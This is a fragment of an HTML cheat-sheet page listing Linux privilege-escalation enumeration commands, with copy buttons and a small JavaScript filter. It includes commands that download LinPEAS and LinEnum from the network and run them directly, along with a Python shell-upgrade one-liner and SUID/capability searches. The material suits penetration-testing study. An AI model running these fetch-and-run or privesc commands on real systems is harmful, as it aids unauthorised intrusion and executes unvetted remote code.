        <div class="cs-cmd"><div class="cs-cmd-text">cat /etc/crontab && ls -la /etc/cron*<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Check scheduled cron jobs for privesc opportunities</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">ps aux | grep root<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">List processes running as root</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">netstat -tulpn 2>/dev/null || ss -tulpn<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">List open ports and listening services</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">SUID / Sudo / Capabilities</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">find / -perm -4000 -type f 2>/dev/null<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Find all SUID binaries — common privesc vector</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">sudo -l<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">List commands current user can run with sudo</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">getcap -r / 2>/dev/null<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Find binaries with special Linux capabilities</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">find / -writable -type f 2>/dev/null | grep -v proc<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Find world-writable files — check for config abuse</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Automated Enumeration Scripts</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Run LinPEAS — comprehensive Linux privesc checker</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && bash LinEnum.sh<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Run LinEnum enumeration script</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">python3 -c 'import pty; pty.spawn("/bin/bash")'<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Upgrade to interactive TTY shell with Python</div></div>
      </div>
    </div>
  </div>

</div>

<script>
function showTool(tool) {
  document.querySelectorAll('.cs-section').forEach(s => s.classList.remove('active'));
  document.querySelectorAll('.cs-tab').forEach(t => t.classList.remove('active'));
  document.getElementById('tool-' + tool).classList.add('active');
  event.target.classList.add('active');
  updateCount();
}

function copyCmd(btn) {
  var text = btn.parentElement.childNodes[0].textContent.trim();
  navigator.clipboard.writeText(text).then(function() {
    btn.textContent = 'done!';
    btn.classList.add('copied');
    setTimeout(function() { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
  });
}

function filterCommands(q) {
  q = q.toLowerCase();
  document.querySelectorAll('.cs-cmd').forEach(function(cmd) {
    var text = cmd.textContent.toLowerCase();
    cmd.style.display = (!q || text.includes(q)) ? '' : 'none';
  });
  if (q) {
    document.querySelectorAll('.cs-section').forEach(s => s.classList.remove('active'));
    document.querySelectorAll('.cs-section').forEach(function(s) {
      var visible = Array.from(s.querySelectorAll('.cs-cmd')).some(c => c.style.display !== 'none');
      if (visible) s.classList.add('active');
    });
  } else {
    document.querySelectorAll('.cs-section').forEach(s => s.classList.remove('active'));
    document.getElementById('tool-nmap').classList.add('active');
  }
  updateCount();
}

function updateCount() {
  var visible = document.querySelectorAll('.cs-cmd:not([style*="display: none"])').length;
  document.getElementById('cs-count').innerHTML = '<span>' + visible + '</span> commands shown';
}

window.onload = updateCount;
</script>
